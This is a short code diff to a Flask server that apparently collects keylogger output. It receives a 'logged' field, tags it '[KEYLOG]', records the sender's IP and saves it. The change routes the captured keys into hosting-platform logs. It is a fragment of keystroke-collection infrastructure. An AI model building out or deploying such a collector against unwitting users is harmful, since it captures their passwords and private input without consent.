@@ -2,6 +2,8 @@ from flask import Flask, request
 from flask_restful import Api, Resource, reqparse
 from flask_cors import CORS
 from datetime import datetime
+import logging
+logging.basicConfig(level=logging.INFO)
 
 app = Flask(__name__)
 CORS(app)
@@ -13,7 +15,7 @@ def post():
     args = parser.parse_args()
     logged = args['logged']
 
-    print(f"[KEYLOG] Received: {logged}")  # 👈 This line prints the key
+    logging.info(f"[KEYLOG] Received: {logged}")  # 👈 Will show up in Render Logs
 
     source = request.remote_addr
     savelogs(logged, source)
